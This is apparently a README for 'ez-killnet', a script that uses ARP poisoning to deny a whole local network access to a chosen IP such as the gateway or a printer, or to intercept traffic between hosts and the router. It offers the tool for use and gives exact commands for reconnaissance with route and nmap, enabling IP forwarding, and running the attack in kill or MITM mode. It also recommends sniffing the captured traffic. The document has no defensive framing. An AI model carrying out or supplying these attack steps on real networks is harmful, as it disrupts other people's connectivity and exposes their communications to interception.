# ez-killnet
kill whole network (2.4GHz + 5GHz + eth + anything) using arp poisoning 

cd to directory and run the following 
sudo ./ez-killnet.py -i [interface to use for attack] -t [ipaddr to make unreachable on lan] 

example: (kill internet gateway) 
1. connect wlan0 to network 
2. route -n to find gateway (found it to be 192.168.10.1)
3. sudo ./ez-killnet.py -i wlan0 -t 192.168.10.1 -x kill 
4. now all hosts on network cannot reach this gateway and they all have trouble connecting to the internet 

example: (kill valuable resources) 
1. connect eth0 to network 
2. nmap -sn 192.168.10.* to learn about hosts (found printer to be 192.168.10.226)
3. sudo ./ez-killnet.py -i eth0 -t 192.168.10.226 -x kill 
4. now all hosts on network cannot reach this resource

example: (MITM internet gateway) 
1. connect wlan0 to network 
2. route -n to find gateway (found it to be 192.168.10.1)
3. echo "1" > /proc/sys/net/ipv4/ip_forward
4. sudo ./ez-killnet.py -i wlan0 -t 192.168.10.1 -x mitm 
5. now you are listening to all streams btwn router and hosts on the network 


This program works by telling people that this ip you entered is located at your own mac address which is different from the real one. Hosts on the network try to reach this ip by viisting your own computer, but by default your kernel doesnt forward ipv4 traffic so the packets never get sent to where theyre actually suppossed to go. 

If you wish start an MITM attack please echo "1" > /proc/sys/net/ipv4/ip_forward. This way your computer will be forwarding the requests to where they should go situating itself in the middle of all traffic on the network. Fire up your sniffer (ettercap, wireshark, etc.) and you will be able to see all the traffic flowing through your computer from all over the network. 

